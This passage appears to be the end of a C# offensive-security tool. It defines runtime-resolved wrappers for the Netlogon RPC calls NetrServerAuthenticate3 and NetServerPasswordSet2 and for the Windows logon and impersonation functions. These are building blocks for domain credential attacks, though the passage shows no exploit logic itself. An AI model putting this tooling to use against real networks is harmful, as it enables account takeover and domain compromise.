        public static uint NetrServerAuthenticate3(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr PrimaryName, IntPtr AccountName, NETLOGON_SECURE_CHANNEL_TYPE SecoureChannelType, IntPtr ComputerName, IntPtr ClientChallenge, out NETLOGON_CREDENTIAL ServerChallenge, out uint NegotiateFlags, out uint AccountRid)
        {

            IntPtr proc = GetProcAddress(GetRpcrt4(), "NdrClientCall2");

            SysCall.Delegates.NetrServerAuthenticate3 NetrServerAuthenticate3 = (SysCall.Delegates.NetrServerAuthenticate3)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.NetrServerAuthenticate3));
            return NetrServerAuthenticate3(pMIDL_STUB_DESC, formatString, PrimaryName,  AccountName,  SecoureChannelType,  ComputerName,  ClientChallenge, out  ServerChallenge, out  NegotiateFlags, out  AccountRid);
        }

        public static uint NetServerPasswordSet2(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr PrimaryName, IntPtr AccountName, NETLOGON_SECURE_CHANNEL_TYPE AccountType, IntPtr ComputerName, IntPtr Authenticator, IntPtr ReturnAuthenticator, IntPtr ClearNewPassword)
        {

            IntPtr proc = GetProcAddress(GetRpcrt4(), "NdrClientCall2");

            SysCall.Delegates.NetServerPasswordSet2 NetServerPasswordSet2 = (SysCall.Delegates.NetServerPasswordSet2)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.NetServerPasswordSet2));
            return NetServerPasswordSet2(pMIDL_STUB_DESC, formatString, PrimaryName,  AccountName,  AccountType,  ComputerName,  Authenticator,  ReturnAuthenticator,  ClearNewPassword);
        }

        public static bool LogonUser(string pszUserName, string pszDomain, string pszPassword, int dwLogonType, int dwLogonProvider, ref IntPtr phToken)
        {
            IntPtr proc = GetProcAddress(GetAdvapi32(), "LogonUserA");
            SysCall.Delegates.LogonUser LogonUser = (SysCall.Delegates.LogonUser)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.LogonUser));
            return LogonUser( pszUserName,  pszDomain,  pszPassword,  dwLogonType,  dwLogonProvider, ref  phToken);
        }

        public static bool RevertToSelf()
        {
            IntPtr proc = GetProcAddress(GetAdvapi32(), "RevertToSelf");
            SysCall.Delegates.RevertToSelf RevertToSelf = (SysCall.Delegates.RevertToSelf)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.RevertToSelf));
            return RevertToSelf();
        }

        public static bool ImpersonateLoggedOnUser(IntPtr hToken)
        {
            IntPtr proc = GetProcAddress(GetAdvapi32(), "ImpersonateLoggedOnUser");
            SysCall.Delegates.ImpersonateLoggedOnUser ImpersonateLoggedOnUser = (SysCall.Delegates.ImpersonateLoggedOnUser)Marshal.GetDelegateForFunctionPointer(proc, typeof(SysCall.Delegates.ImpersonateLoggedOnUser));
            return ImpersonateLoggedOnUser(hToken);
        }

    }
}
